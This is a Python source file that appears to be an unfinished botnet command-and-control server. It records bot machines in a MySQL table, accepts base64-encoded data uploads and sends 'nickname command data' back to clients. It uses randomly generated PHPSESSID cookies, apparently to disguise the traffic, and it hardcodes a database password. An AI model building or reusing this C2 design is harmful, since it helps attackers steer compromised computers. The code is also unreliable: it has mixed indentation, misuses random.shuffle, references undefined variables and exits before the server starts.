import socketserver
import mysql.connector
from threading import Thread
# from legend import server_legacy
import requests
import os, subprocess
import string, random
import socket, base64
from http.server import BaseHTTPRequestHandler
from http.cookies import SimpleCookie
from urllib.parse import unquote
from ast import literal_eval


config = {
    "host": "localhost",
    "user": "worker",
    "password": "forwh4t_subnet",
    "database": "net"
    # auth_plugin='mysql_native_password'
}


def generate_random_string(length):
    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(letters) for i in range(length))


def generate_random_phpsessid():
    random_string = generate_random_string(32)
    random_bytes = os.urandom(16)
    combined = random_string.encode('utf-8') + random_bytes
    encoded = base64.b64encode(combined)
    return encoded.decode('utf-8')


def from_req_to_smth(data):
	dt = []
	for i in range(len(data)):
		q = data[i].split("=")
		q[0] = "'" + q[0] + "'"
		q[1] = "'" + q[1] + "'"
		q = ": ".join(q)
		dt.append(q)

	dt = "{" + ", ".join(dt) + "}"
	dt = literal_eval(dt)
	
	return dt


def get_usernames():
	config = {
		"host": "localhost",
		"user": "worker",
		"password": "forwh4t_subnet",
		"database": "net"
		# auth_plugin='mysql_native_password'
	}
	mydb = mysql.connector.connect(**config)
	mycursor = mydb.cursor()
	sql = "SELECT alias FROM computers"  
	mycursor.execute(sql)
	myresult = mycursor.fetchall()
	myresult = str(myresult).encode()
	# print(myresult)
	mycursor.close()
	mydb.close()

	return literal_eval(myresult.decode())


quries = {}


class Server(BaseHTTPRequestHandler):
	# def __init__(self):
	# 	self.nickname = ""
	# 	self.command = ""
	# 	self.data = ""
		
	def do_POST(self):
		cookies = SimpleCookie(self.headers.get('Cookie'))['PHPSESSID']
		if cookies == "":
		    cookies = SimpleCookie()
		    cookies['PHPSESSID'] = generate_random_phpsessid()
		    self.wfile.write(cookies.output())
		
		quries[cookies.output().split("=")[-1][:]] = random.shuffle(get_usernames())[0][0]
		
		req = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
		req = req.split("&")
		req = from_req_to_smth(req)
		data = base64.b64decode(req['data'])
		
		
		
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()
    	
    
	def do_GET(self):
		cookies = SimpleCookie(self.headers.get('Cookie'))['PHPSESSID']
		if cookies == "":
		    self.send_response(200)
			self.send_header("Content-type", "text/html")
			self.end_headers()
		else:    
			global data
		
			self.send_response(200)
			self.send_header("Content-type", "text/html")
			self.end_headers()
		
		self.wfile.write((nickname + " " + command + " " + data).encode())


    
	def log_message(self, format, *args):
		return
		




        
host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
bot_serv_addr = ("0.0.0.0", 62084)
print(bot_serv_addr)


cookies = SimpleCookie()
cookies['PHPSESSID'] = generate_random_phpsessid()
print( cookies.output().split("=")[-1][:] )

exit()
httpd = socketserver.TCPServer(bot_serv_addr, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()
